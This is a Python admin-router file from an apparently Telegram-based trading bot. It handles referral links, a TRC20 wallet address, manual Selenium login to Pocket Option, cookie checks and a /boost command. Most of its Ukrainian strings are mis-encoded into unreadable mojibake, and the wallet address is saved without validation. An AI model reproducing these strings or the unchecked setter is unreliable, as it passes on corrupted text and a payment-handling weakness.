        f"üîó <b>–ü–æ—Ç–æ—á–Ω–µ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è:</b>\n<code>{current_link}</code>\n\n–í–≤–µ–¥—ñ—Ç—å –Ω–æ–≤–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.callback_query(F.data == "admin_change_ref_link_all")
async def change_ref_link_all_start(callback: CallbackQuery, state: FSMContext):
    """Starts the process of changing the 'All World' referral link."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_ref_link_all)
    current_link = admin_panel.get_referral_settings().get('referral_link_all', 'Not set')
    await callback.message.edit_text(
        f"üîó <b>Current 'All World' link:</b>\n<code>{current_link}</code>\n\nEnter the new link:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.callback_query(F.data == "admin_change_ref_link_russia")
async def change_ref_link_russia_start(callback: CallbackQuery, state: FSMContext):
    """Starts the process of changing the 'Russia' referral link."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_ref_link_russia)
    current_link = admin_panel.get_referral_settings().get('referral_link_russia', 'Not set')
    await callback.message.edit_text(
        f"üîó <b>Current 'Russia' link:</b>\n<code>{current_link}</code>\n\nEnter the new link:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(StateFilter(Admin.change_referral_link), F.text)
async def process_new_ref_link(message: Message, state: FSMContext):
    """–û–Ω–æ–≤–ª—é—î —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è."""
    from app.dispatcher import admin_panel
    admin_panel.set_referral_link(message.text.strip())
    await message.answer("‚úÖ <b>–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –æ–Ω–æ–≤–ª–µ–Ω–æ.</b>", parse_mode="HTML")
    await state.clear()
    await _show_referral_panel(message, state)

@admin_router.message(StateFilter(Admin.change_ref_link_all), F.text)
async def process_new_ref_link_all(message: Message, state: FSMContext):
    """Processes the new 'All World' referral link."""
    from app.dispatcher import admin_panel
    admin_panel.set_referral_link_all(message.text.strip())
    await message.answer("‚úÖ <b>'All World' link updated.</b>", parse_mode="HTML")
    await state.clear()
    await _show_referral_panel(message, state)

@admin_router.message(StateFilter(Admin.change_ref_link_russia), F.text)
async def process_new_ref_link_russia(message: Message, state: FSMContext):
    """Processes the new 'Russia' referral link."""
    from app.dispatcher import admin_panel
    admin_panel.set_referral_link_russia(message.text.strip())
    await message.answer("‚úÖ <b>'Russia' link updated.</b>", parse_mode="HTML")
    await state.clear()
    await _show_referral_panel(message, state)


@admin_router.callback_query(F.data == "admin_change_wallet")
async def change_wallet_address_start(callback: CallbackQuery, state: FSMContext):
    """–ü–æ—á–∏–Ω–∞—î –ø—Ä–æ—Ü–µ—Å –∑–º—ñ–Ω–∏ –∞–¥—Ä–µ—Å–∏ –≥–∞–º–∞–Ω—Ü—è."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_wallet_address)
    current_wallet = admin_panel.get_wallet_address()
    await callback.message.edit_text(
        f"üí≥ <b>–ü–æ—Ç–æ—á–Ω–∏–π –≥–∞–º–∞–Ω–µ—Ü—å:</b>\n<code>{current_wallet}</code>\n\n–í–≤–µ–¥—ñ—Ç—å –Ω–æ–≤—É TRC20 –∞–¥—Ä–µ—Å—É:",
        reply_markup=get_cancel_keyboard("admin_settings"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(StateFilter(Admin.change_wallet_address), F.text)
async def process_new_wallet_address(message: Message, state: FSMContext):
    """–û–±—Ä–æ–±–ª—è—î –Ω–æ–≤—É –∞–¥—Ä–µ—Å—É –≥–∞–º–∞–Ω—Ü—è."""
    from app.dispatcher import admin_panel
    new_address = message.text.strip()
    # TODO: –î–æ–¥–∞—Ç–∏ –≤–∞–ª—ñ–¥–∞—Ü—ñ—é –∞–¥—Ä–µ—Å–∏ TRC20
    admin_panel.set_wallet_address(new_address)
    await message.answer(f"‚úÖ <b>–ê–¥—Ä–µ—Å—É –≥–∞–º–∞–Ω—Ü—è –æ–Ω–æ–≤–ª–µ–Ω–æ.</b>", parse_mode="HTML")
    await _show_settings_panel(message, state)

# endregion

# region Auth Management
@admin_router.callback_query(F.data == "admin_auth")
async def admin_auth_callback(callback: CallbackQuery):
    """–ö–æ–ª–±–µ–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ —Ä—É—á–Ω–æ—ó –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞."""
    from app.dispatcher import admin_panel, trading_api
    if not admin_panel.is_admin(callback.from_user.id):
        await callback.answer("–¶—è –∫–Ω–æ–ø–∫–∞ –ª–∏—à–µ –¥–ª—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤.", show_alert=True)
        return

    # –ó–∞–ø—É—Å–∫–∞—î–º–æ –±—Ä–∞—É–∑–µ—Ä –¥–ª—è —Ä—É—á–Ω–æ–≥–æ –≤—Ö–æ–¥—É
    await callback.message.edit_text("‚è≥ –ó–∞–ø—É—Å–∫–∞—é –±—Ä–∞—É–∑–µ—Ä –¥–ª—è —Ä—É—á–Ω–æ—ó –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó...")
    await trading_api.auth.manual_login_start()

    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –¥—Ä–∞–π–≤–µ—Ä –∑–∞–ø—É—Å—Ç–∏–≤—Å—è
    if trading_api.auth.driver:
        await callback.message.edit_text(
            "‚úÖ –ë—Ä–∞—É–∑–µ—Ä –∑–∞–ø—É—â–µ–Ω–æ.\n\n"
            "–ë—É–¥—å –ª–∞—Å–∫–∞, —É–≤—ñ–π–¥—ñ—Ç—å –¥–æ —Å–≤–æ–≥–æ –∞–∫–∞—É–Ω—Ç—É Pocket Option —É –≤—ñ–∫–Ω—ñ, —â–æ –≤—ñ–¥–∫—Ä–∏–ª–æ—Å—è.\n\n"
            "–ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ–≥–æ –≤—Ö–æ–¥—É —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–æ—Ä–≥–æ–≤–æ–≥–æ –∫–∞–±—ñ–Ω–µ—Ç—É, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∏–∂—á–µ.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="‚úÖ –Ø —É–≤—ñ–π—à–æ–≤ –¥–æ –∞–∫–∞—É–Ω—Ç—É", callback_data="admin_confirm_auth")]
            ])
        )
    else:
        await callback.message.edit_text("‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –±—Ä–∞—É–∑–µ—Ä Selenium. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ª–æ–≥–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ.")
    await callback.answer()

@admin_router.callback_query(F.data == "admin_confirm_auth")
async def process_manual_login_confirmation(callback: CallbackQuery, state: FSMContext):
    """Handles the 'I have logged in' confirmation button."""
    from app.dispatcher import trading_api
    await callback.message.edit_text("‚è≥ –ü–µ—Ä–µ–≤—ñ—Ä—è—é –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó —Ç–∞ –æ–Ω–æ–≤–ª—é—é —Å–µ—Å—ñ—é...")

    # This single call now handles confirmation, saving cookies, and re-initializing the API
    success = await trading_api.perform_manual_login_confirm()

    if success:
        balance = await trading_api.get_balance()
        balance_text = f"${balance:.2f}" if balance is not None else "–Ω–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏"
        await callback.message.answer(
            "‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—è —É—Å–ø—ñ—à–Ω–∞! –°–µ—Å—ñ—é –æ–Ω–æ–≤–ª–µ–Ω–æ.\n"
            f"API –≥–æ—Ç–æ–≤–∏–π –¥–æ —Ä–æ–±–æ—Ç–∏. –ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å: <b>{balance_text}</b>",
            parse_mode="HTML"
        )
    else:
        await callback.message.answer(
            "‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é. –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤–∏ —É–≤—ñ–π—à–ª–∏ –¥–æ –∞–∫–∞—É–Ω—Ç—É —É –≤—ñ–∫–Ω—ñ –±—Ä–∞—É–∑–µ—Ä–∞, —Ç–∞ —Å–ø—Ä–æ–±—É–π—Ç–µ –∑–Ω–æ–≤—É."
        )

    await show_admin_panel(callback, state)


@admin_router.callback_query(F.data == "start_manual_auth")
async def start_manual_auth_handler(callback: CallbackQuery):
    """
    –û–±—Ä–æ–±–ª—è—î –≤–∏–∫–ª–∏–∫ 'start_manual_auth' –∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è-—Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è.
    –ó–∞–ø–∏—Ç—É—î —É –∞–¥–º—ñ–Ω–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –ø–µ—Ä–µ–¥ –ø–æ—á–∞—Ç–∫–æ–º –ø—Ä–æ—Ü–µ—Å—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó.
    """
    await admin_auth_callback(callback)

# endregion

# region Other
@admin_router.callback_query(F.data == "admin_referrals")
async def show_admin_referrals(callback: CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—É—î —Å–ø–∏—Å–æ–∫ —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤."""
    # –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –ø–æ—Ç—Ä–µ–±—É—î —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó
    await callback.answer("–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤ —Ä–æ–∑—Ä–æ–±—Ü—ñ.", show_alert=True)


@admin_router.callback_query(F.data == "admin_check_cookies")
async def check_cookies_status(callback: CallbackQuery):
    """–ü–µ—Ä–µ–≤—ñ—Ä—è—î —Å—Ç–∞—Ç—É—Å cookie —ñ –Ω–∞–¥—Å–∏–ª–∞—î –∑–≤—ñ—Ç."""
    from app.dispatcher import trading_api
    are_valid = trading_api.auth.are_cookies_valid()

    if are_valid:
        expiry_time = trading_api.auth.get_expiration_time()
        if expiry_time:
            now = datetime.now()
            time_left = expiry_time - now
            days = time_left.days
            hours, remainder = divmod(time_left.seconds, 3600)
            minutes, _ = divmod(remainder, 60)

            expiry_date_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")

            message_text = (
                f"‚úÖ –°—Ç–∞—Ç—É—Å Cookies\n\n"
                f"Cookie –¥—ñ–π—Å–Ω—ñ. –ó–∞–ª–∏—à–∏–ª–æ—Å—è: {days} –¥–Ω., {hours} –≥–æ–¥., {minutes} —Ö–≤.\n"
                f"–ù–∞—Å—Ç—É–ø–Ω–µ –ø—Ä–∏–º—É—Å–æ–≤–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è: {expiry_date_str}"
            )
        else:
            message_text = "‚úÖ Cookie –¥—ñ–π—Å–Ω—ñ, –∞–ª–µ –Ω–µ –≤–¥–∞–ª–æ—Å—è –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —Ç–æ—á–Ω–∏–π —á–∞—Å –æ–Ω–æ–≤–ª–µ–Ω–Ω—è."
    else:
        message_text = "‚ùå Cookie –Ω–µ–¥—ñ–π—Å–Ω—ñ –∞–±–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ!\n\n–ù–µ–æ–±—Ö—ñ–¥–Ω–æ –ø—Ä–æ–≤–µ—Å—Ç–∏ —Ä—É—á–Ω—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é."

    await callback.answer(message_text, show_alert=True)

@admin_router.callback_query(F.data == "admin_workspace")
async def show_admin_workspace(callback: CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—É—î —Ä–æ–±–æ—á—É –æ–±–ª–∞—Å—Ç—å (–ø—Ä–∏–∫–ª–∞–¥)."""
    # –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –ø–æ—Ç—Ä–µ–±—É—î —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó
    await callback.answer("–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤ —Ä–æ–∑—Ä–æ–±—Ü—ñ.", show_alert=True)


@admin_router.message(Command("boost"))
async def manual_boost_command(message: Message):
    """
    Manually starts a boost for a user.
    Format: /boost <user_id> <initial_balance>
    Only for admins.
    """
    from app.dispatcher import admin_panel, bot

    if not admin_panel.is_admin(message.from_user.id):
        await message.reply("This command is for admins only.")
        return

    args = message.text.split()
    if len(args) != 3:
        await message.reply("Usage: `/boost <user_id> <initial_balance>`", parse_mode="Markdown")
        return

    try:
        user_id_to_boost = int(args[1])
        initial_balance = float(args[2])
    except (ValueError, IndexError):
        await message.reply("Invalid arguments. Please use numbers for user ID and balance.\nUsage: `/boost <user_id> <initial_balance>`", parse_mode="Markdown")
        return

    # The only platform with this boost mechanism is 'pocket'
    platform = "pocket"

    # Start the boost
    try:
        start_boost(user_id_to_boost, initial_balance, platform)

        # Notify the admin
        await message.reply(f"‚úÖ Successfully started a boost for user `{user_id_to_boost}` with an initial balance of `${initial_balance:.2f}`.", parse_mode="Markdown")

    except Exception as e:
        logger.error(f"Failed to manually start boost for user {user_id_to_boost}: {e}")
        await message.reply(f"‚ùå An error occurred while trying to start the boost: `{e}`", parse_mode="Markdown")


@admin_router.callback_query(F.data == "admin_panel")
async def back_to_admin_panel(callback: CallbackQuery, state: FSMContext):
    """–û–±—Ä–æ–±–Ω–∏–∫ –¥–ª—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –≤ –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é –∞–¥–º—ñ–Ω–∫–∏."""
    await state.clear()
    await show_admin_panel(callback, state)

@admin_router.callback_query(F.data == "admin_settings")
async def back_to_settings(callback: CallbackQuery, state: FSMContext):
    """–û–±—Ä–æ–±–Ω–∏–∫ –¥–ª—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –≤ –º–µ–Ω—é –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å."""
    await _show_settings_panel(callback, state)